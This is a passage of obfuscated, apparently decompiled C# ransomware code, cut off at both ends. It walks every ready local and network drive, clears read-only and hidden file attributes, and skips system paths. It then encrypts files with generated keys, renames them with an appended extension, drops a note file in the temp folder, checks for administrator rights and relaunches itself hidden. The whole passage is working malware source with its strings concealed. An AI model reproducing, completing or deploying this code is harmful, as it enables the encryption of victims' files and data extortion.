	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string FktsKkXRDIStg(string aEuLsbfOOx, int WDXvzhvfKo = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(WDXvzhvfKo);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(aEuLsbfOOx, 1, intPtr, ref WDXvzhvfKo) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void kgxecZsMbpHn()
	{
		iDwobxXLVYBDUs(getString_0(107396457), HnrHiFTDAEzVb(getString_0(107387367)));
		string text = HnrHiFTDAEzVb(getString_0(107386661));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107389339) + text + getString_0(107389339) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396457);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void JxJsKmGJSdnj(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(ZOToawIMfprr, getString_0(107386596) + string_0 + getString_0(107386555) + ex.Message + getString_0(107396260));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string swuZnlPkVSzF()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107390075);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386498);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386489))) ? getString_0(107386503) : getString_0(107386512));
				break;
			case 0:
				text = getString_0(107386494);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386973);
				break;
			case 4:
				text = getString_0(107386992);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386942) : getString_0(107386983));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386950) : getString_0(107386955)) : getString_0(107386960)) : getString_0(107386937));
				break;
			case 10:
				text = getString_0(107386945);
				break;
			}
		}
		if (text != getString_0(107390075))
		{
			text = getString_0(107386908) + text;
			if (oSVersion.ServicePack != getString_0(107390075))
			{
				text = text + getString_0(107388956) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string KisRUlBWicMvke(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395373);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107395332)));
				streamWriter.WriteLine(getString_0(107396260));
				streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107391782)));
				streamWriter.WriteLine(string_0);
				if (FjsJwHpFzPmVq)
				{
					streamWriter.WriteLine(getString_0(107396260));
					streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107391640)));
					streamWriter.WriteLine(wdiXDjuJgNGJ.DThwkdtaJZ());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !sFwpaHIPJDNK)
				{
					File.AppendAllText(text, getString_0(107391607) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(ZOToawIMfprr, getString_0(107386927) + ex.Message + getString_0(107396260));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void eemtrgzEBOUiyZzv(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		mVDRxhprWxh.YnXTpzxqCPoej CS_0024_003C_003E8__locals0 = new mVDRxhprWxh();
		CS_0024_003C_003E8__locals0.ExregTQqVbzs = string_1;
		CS_0024_003C_003E8__locals0.gTewCUcTGBbbz = string_2;
		CS_0024_003C_003E8__locals0.hAIQNoQXeEDNR = string_3;
		CS_0024_003C_003E8__locals0.acsTZIiNbXCOpEv = string_4;
		FlUpRKIMpc = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.hAIQNoQXeEDNR);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396476))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = FktsKkXRDIStg(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !bxAnSckylQQtw.Contains(text))
							{
								bxAnSckylQQtw.Add(text);
							}
							else if (!bxAnSckylQQtw.Contains(array[i].Name))
							{
								bxAnSckylQQtw.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!bxAnSckylQQtw.Contains(array[i].Name))
							{
								bxAnSckylQQtw.Add(array[i].Name);
							}
						}
					}
					else if (!bxAnSckylQQtw.Contains(array[i].Name))
					{
						bxAnSckylQQtw.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!bxAnSckylQQtw.Contains(string_0[j]))
				{
					bxAnSckylQQtw.Add(string_0[j]);
				}
			}
		}
		if (bxAnSckylQQtw.Contains(HnrHiFTDAEzVb(getString_0(107386838))) && raHBJYQabcE == getString_0(107396857))
		{
			bxAnSckylQQtw.Remove(HnrHiFTDAEzVb(getString_0(107386838)));
		}
		Parallel.ForEach(bxAnSckylQQtw, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new mVDRxhprWxh.YnXTpzxqCPoej();
			CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH = string_0;
			if (MJkKDioyTKQW && !swuZnlPkVSzF().Contains(mVDRxhprWxh.getString_0(107386955)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						gzuABFpjzsBXl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (paHHgwLQtjlpi == mVDRxhprWxh.getString_0(107396870))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					urvqDrraKd(CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.ExregTQqVbzs, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.acsTZIiNbXCOpEv, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.gTewCUcTGBbbz, CS_0024_003C_003E8__locals0.gcHbdKcxYfMKU.hAIQNoQXeEDNR);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				urvqDrraKd(CS_0024_003C_003E8__locals0.KvgyUYwPQEMcH, CS_0024_003C_003E8__locals0.ExregTQqVbzs, CS_0024_003C_003E8__locals0.acsTZIiNbXCOpEv, CS_0024_003C_003E8__locals0.gTewCUcTGBbbz, CS_0024_003C_003E8__locals0.hAIQNoQXeEDNR);
			}
		});
	}

	public static void urvqDrraKd(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107390075));
		List<string> list3 = list2;
		if (YzRuiFIlBCdqK == getString_0(107397017))
		{
			if (PoMiZLuhKNIJ == getString_0(107396857) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && zFZHgwXyEcLQD(string_0))
			{
				YJsPdiWqjxet yJsPdiWqjxet = null;
				try
				{
					yJsPdiWqjxet = new YJsPdiWqjxet(string_0.Replace(getString_0(107397194), getString_0(107390075)));
				}
				catch
				{
					list = URgDlqMhRwahBlLO(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					zkFahwNpddHP(yJsPdiWqjxet.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = URgDlqMhRwahBlLO(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = URgDlqMhRwahBlLO(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = DOsEpLcfrEO.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0458;
					}
				}
				if ((dLlZlbHnZKXOUVzbI == getString_0(107397017) && !item.EndsWith(text)) || gHJtQxzOYMxb.Contains(item))
				{
					continue;
				}
				if (JuoxaLNRiTYHeY == getString_0(107396857))
				{
					try
					{
						if (CHfiOAUpccl.fhCAURzyMsnRokFU(item))
						{
							CHfiOAUpccl.zMWyOqfMOtzftHw(item);
						}
					}
					catch
					{
					}
				}
				gHJtQxzOYMxb.Add(item);
				if (!mRCgNmhiRqq.Contains(Path.GetDirectoryName(item)))
				{
					mRCgNmhiRqq.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (loDvPGrZMBwOJMj == getString_0(107396857) && fileStream.Length > Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024 && !list3.Contains(text))
					{
						if (grVWpVNxmvUXt == getString_0(107396857))
						{
							foreach (string item2 in YXlceGYDfnj)
							{
								if (item.ToLower().EndsWith(item2) && BMlICsewZHNNqOZxm == getString_0(107396857))
								{
									if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && BMlICsewZHNNqOZxm == getString_0(107397017))
								{
									try
									{
										wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = wZhxBLOUELLD.YyvEaXvrgGWE(item, Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024);
						byte[] zuPICqOHsAezK = wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						wZhxBLOUELLD.kFTEsbJnnwQZ(item, zuPICqOHsAezK);
						if (string_2 != getString_0(107386861))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386861))
					{
						sxtvKjJmiNU(item, item + string_2, FlUpRKIMpc);
					}
					else
					{
						sxtvKjJmiNU(item, item + getString_0(107386856), FlUpRKIMpc);
					}
				}
				catch (Exception)
				{
				}
				IL_0458:;
			}
		}
	}

	public static void zkFahwNpddHP(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		xtcPtppfARaJuWs.zHykNUMLBYF CS_0024_003C_003E8__locals0 = new xtcPtppfARaJuWs();
		CS_0024_003C_003E8__locals0.wNdNDiAzKQBqV = list_0;
		CS_0024_003C_003E8__locals0.uYKcRkbjPyG = string_1;
		CS_0024_003C_003E8__locals0.odyeEpsXhVRV = string_2;
		CS_0024_003C_003E8__locals0.rlUOZBzOokWP = string_3;
		CS_0024_003C_003E8__locals0.yWPREClwPTEqF = new List<string> { getString_0(107390075) };
		if (dLlZlbHnZKXOUVzbI == getString_0(107397017))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.wNdNDiAzKQBqV)
				{
					if (!item.Contains(xtcPtppfARaJuWs.getString_0(107390064)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107390071)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107390038)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107390021)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107390008)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389983)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389930)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389949)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389904)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389867)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389890)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389841)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389847)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389314)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389257)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389272)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389223)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389238)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389221)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389172)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389187)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389138)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389157)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389104)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389123)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389110)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389093)) && !item.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389556)) && !item.Contains(HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107389571))) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389514)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107397210)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389533)) && !item.EndsWith(CS_0024_003C_003E8__locals0.uYKcRkbjPyG) && !item.EndsWith(xtcPtppfARaJuWs.getString_0(107389496)) && !item.EndsWith(xtcPtppfARaJuWs.getString_0(107389459)) && !item.EndsWith(xtcPtppfARaJuWs.getString_0(107389454)) && !item.EndsWith(xtcPtppfARaJuWs.getString_0(107389449)) && !item.Contains(xtcPtppfARaJuWs.getString_0(107389476)) && !item.Contains(AlXvbFdlnNXOi) && !item.Contains(ZOToawIMfprr) && !item.Contains(fnEjkTZXUzKS))
					{
						if (CS_0024_003C_003E8__locals0.odyeEpsXhVRV.Length != 0)
						{
							string[] odyeEpsXhVRV2 = CS_0024_003C_003E8__locals0.odyeEpsXhVRV;
							int num2 = 0;
							while (num2 < odyeEpsXhVRV2.Length)
							{
								string value2 = odyeEpsXhVRV2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e2a;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.uYKcRkbjPyG))
							{
								goto IL_0e2a;
							}
						}
						catch (Exception)
						{
							goto IL_0e2a;
						}
						if (item.EndsWith(string_0) && !gHJtQxzOYMxb.Contains(item))
						{
							if (JuoxaLNRiTYHeY == xtcPtppfARaJuWs.getString_0(107396878))
							{
								try
								{
									if (CHfiOAUpccl.fhCAURzyMsnRokFU(item))
									{
										CHfiOAUpccl.zMWyOqfMOtzftHw(item);
									}
								}
								catch
								{
								}
							}
							gHJtQxzOYMxb.Add(item);
							if (!mRCgNmhiRqq.Contains(Path.GetDirectoryName(item)))
							{
								mRCgNmhiRqq.Add(Path.GetDirectoryName(item));
							}
							JxJsKmGJSdnj(item);
							try
							{
								new tSjEsjVhFLRDyuWQ().mfWczWUMLYhnzT(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (rjVAnmtTRGwdsGoP)
										{
											Console.WriteLine(xtcPtppfARaJuWs.getString_0(107404188) + item + xtcPtppfARaJuWs.getString_0(107403599) + new FileInfo(item).Length + xtcPtppfARaJuWs.getString_0(107403610));
											Console.WriteLine(xtcPtppfARaJuWs.getString_0(107403569));
										}
									}
									catch
									{
									}
									iDwobxXLVYBDUs(HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403464)), xtcPtppfARaJuWs.getString_0(107389360) + item + xtcPtppfARaJuWs.getString_0(107389360) + HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403439)) + xtcPtppfARaJuWs.getString_0(107389360) + Environment.UserName + xtcPtppfARaJuWs.getString_0(107389360) + HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403454)));
								}
							}
							catch (Exception ex18)
							{
								if (eCrtUqxUXqEDfkG)
								{
									try
									{
										File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + item + xtcPtppfARaJuWs.getString_0(107403429) + ex18.Message + xtcPtppfARaJuWs.getString_0(107396281));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (eCrtUqxUXqEDfkG)
									{
										try
										{
											File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + item + xtcPtppfARaJuWs.getString_0(107403828) + ex20.Message + xtcPtppfARaJuWs.getString_0(107396281));
										}
										catch (Exception)
										{
										}
									}
									cMPsaAWwrrbpa++;
									goto end_IL_0716_2;
								}
								if (!(loDvPGrZMBwOJMj == xtcPtppfARaJuWs.getString_0(107396878)) || new FileInfo(item).Length <= Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024 || CS_0024_003C_003E8__locals0.yWPREClwPTEqF.Contains(string_0))
								{
									if (FjsJwHpFzPmVq)
									{
										CS_0024_003C_003E8__locals0.uYKcRkbjPyG = WxVPvEgBcYyDLSq + CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
									}
									string text3 = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
									string s3 = gXnOfppahrNWi.sBDlGorhadqnmxr(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
									{
										if (!lLDISlXAEBoGjsf)
										{
											if (!sFwpaHIPJDNK)
											{
												nIyfuHCZss(item, item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, FlUpRKIMpc);
											}
											else
											{
												nIyfuHCZss(item, item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, Encoding.ASCII.GetBytes(text3));
											}
										}
										else
										{
											try
											{
												if (!sFwpaHIPJDNK)
												{
													nOFFyaCnYAwSb(item, item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, FlUpRKIMpc);
												}
												else
												{
													nOFFyaCnYAwSb(item, item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, Encoding.ASCII.GetBytes(text3));
												}
											}
											catch (Exception ex22)
											{
												if (eCrtUqxUXqEDfkG)
												{
													try
													{
														File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + item + xtcPtppfARaJuWs.getString_0(107386836) + ex22.Message + xtcPtppfARaJuWs.getString_0(107396281));
													}
													catch (Exception)
													{
													}
												}
												cMPsaAWwrrbpa++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!lLDISlXAEBoGjsf)
									{
										if (!sFwpaHIPJDNK)
										{
											nIyfuHCZss(item, item + xtcPtppfARaJuWs.getString_0(107386877), FlUpRKIMpc);
										}
										else
										{
											nIyfuHCZss(item, item + xtcPtppfARaJuWs.getString_0(107386877), Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!sFwpaHIPJDNK)
											{
												nOFFyaCnYAwSb(item, item, FlUpRKIMpc);
											}
											else
											{
												nOFFyaCnYAwSb(item, item, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex25)
										{
											if (eCrtUqxUXqEDfkG)
											{
												try
												{
													File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + item + xtcPtppfARaJuWs.getString_0(107386836) + ex25.Message + xtcPtppfARaJuWs.getString_0(107396281));
												}
												catch (Exception)
												{
												}
											}
											cMPsaAWwrrbpa++;
											goto end_IL_0716_2;
										}
									}
									if (sFwpaHIPJDNK)
									{
										if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
										{
											dnVJbaOwGkkjKGJ(item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, bytes3);
										}
										else
										{
											dnVJbaOwGkkjKGJ(item, bytes3);
										}
									}
									goto IL_0e2a;
								}
								CS_0024_003C_003E8__locals0 = new xtcPtppfARaJuWs.argzCettJfDWZ();
								CS_0024_003C_003E8__locals0.IkKoTnSnjIE = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
									{
										if (FjsJwHpFzPmVq)
										{
											CS_0024_003C_003E8__locals0.uYKcRkbjPyG = WxVPvEgBcYyDLSq + CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG);
									}
								}
								catch (Exception ex27)
								{
									if (eCrtUqxUXqEDfkG)
									{
										try
										{
											File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + item + xtcPtppfARaJuWs.getString_0(107403799) + ex27.Message + xtcPtppfARaJuWs.getString_0(107396281));
										}
										catch (Exception)
										{
										}
									}
									cMPsaAWwrrbpa++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = xtcPtppfARaJuWs.getString_0(107390096);
								if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
								{
									CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
								}
								else
								{
									CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh = item;
								}
								if (grVWpVNxmvUXt == xtcPtppfARaJuWs.getString_0(107396878))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in YXlceGYDfnj)
										{
											if (CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107396881))
											{
												if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh).Length)
												{
													try
													{
														wdiXDjuJgNGJ.DCRZpKamZEizX(xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390212), xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390207), xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390162), CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh.ToLower().EndsWith(item2) && BMlICsewZHNNqOZxm == xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107397041))
											{
												try
												{
													wdiXDjuJgNGJ.DCRZpKamZEizX(xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390212), xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390207), xtcPtppfARaJuWs.argzCettJfDWZ.getString_0(107390162), CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text4 = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
								string s4 = gXnOfppahrNWi.sBDlGorhadqnmxr(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (dtBtLrowijPwW == xtcPtppfARaJuWs.getString_0(107397038))
								{
									byte[] array2 = null;
									byte[] byte_2 = wZhxBLOUELLD.YyvEaXvrgGWE(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024);
									if (wZhxBLOUELLD.kFTEsbJnnwQZ(ZuPICqOHsAezK: (!JQllwusRFZbJU) ? (sFwpaHIPJDNK ? wZhxBLOUELLD.TWWzYeNNrdZT(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : wZhxBLOUELLD.TWWzYeNNrdZT(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sFwpaHIPJDNK ? eihvGbfwnIee.kXimjkJppApPOW(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eihvGbfwnIee.kXimjkJppApPOW(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), lMQywbZRpEOBbR: CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, iPDawhgBDCF: bytes4))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!sFwpaHIPJDNK)
								{
									if (eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, ThqgRSrzuFx, CS_0024_003C_003E8__locals0.rlUOZBzOokWP))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.HHLUHtxrPXAANh, ThqgRSrzuFx, text4, bytes4))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e2a;
							}
						}
					}
					continue;
					IL_0e2a:
					CS_0024_003C_003E8__locals0.wNdNDiAzKQBqV.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.wNdNDiAzKQBqV, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new xtcPtppfARaJuWs.zHykNUMLBYF();
			CS_0024_003C_003E8__locals0.IkKoTnSnjIE = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx = string_0;
			if (!CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107390064)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107390071)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107390038)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107390021)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107390008)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389983)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389930)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389949)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389904)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389867)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389890)) && 